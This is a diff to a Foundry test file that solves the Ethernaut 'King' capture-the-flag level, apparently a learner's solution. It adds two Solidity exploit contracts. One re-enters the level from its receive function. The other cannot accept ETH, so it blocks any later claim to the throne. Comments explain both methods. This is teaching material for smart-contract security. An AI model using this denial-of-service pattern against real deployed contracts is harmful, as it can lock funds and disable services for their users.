@@ -24,8 +24,9 @@ contract TestKing is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
         level = King(levelAddress);
 
@@ -34,29 +35,51 @@ contract TestKing is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
+
+        // In this level Factory must not be the king of the King contract
+        // 2 ways to solve this level:
+
+        // 1. Create a contract with that can call King to become king, and then make its receive() function call King with ETH again.
+        // It works because this contract is the king, then factory sends ETH to King, which causes King send ETH to its king, triggering our contracts receive().
+        // It says Contract is out of gas, therefore Factorys call with ETH reverts. But why out of gas? Need to get back to it.
+
+        // 2. Create a contract that has no way to accept ETH, causing receive() revert once this contract becomes the king.
 
         vm.startPrank(player, player);
 
-        // As we said in the previous CTF challenge the only way to receive ether are via
-        // 1) A receive function
-        // 2) A payable fallback function
-        // 3) "forced" by a selfdestruct that target our contract
-        // What do you think that could happen in this case when the new king is a contract that cannot receive ether
-        // and someone try to become the newest king?
-        // The contract will revert because the previous king (our contract) have no way to receive the "treasury"!
+        // // Method number 1
+        // ExploitWithReceive exploit = new ExploitWithReceive{value: 0.001 ether}(payable(address(level)));
+        // ExploitWithReceive.becomeKing();
 
-        Exploiter exploiter = new Exploiter{value: level.prize() + 1}(payable(address(level)));
-
-        assertEq(level._king(), address(exploiter));
+        // Method number 2
+        Exploit exploit = new Exploit();
+        exploit.becomeKing{value: level.prize()}(payable(address(level)));
 
         vm.stopPrank();
     }
 }
 
-contract Exploiter {
-    constructor(address payable to) public payable {
-        (bool success, ) = address(to).call{value: msg.value}("");
-        require(success, "we are not the new king");
+contract ExploitWithReceive {
+    address payable public level;
+
+    constructor(address payable _level) public payable {
+        level = _level;
+    }
+
+    function becomeKing() public {
+        level.call{value: 0.001 ether}("");
+    }
+
+    receive() external payable {
+        becomeKing();
+    }
+}
+
+contract Exploit {
+    function becomeKing(address payable level) public payable {
+        level.call{value: msg.value}("");
     }
 }
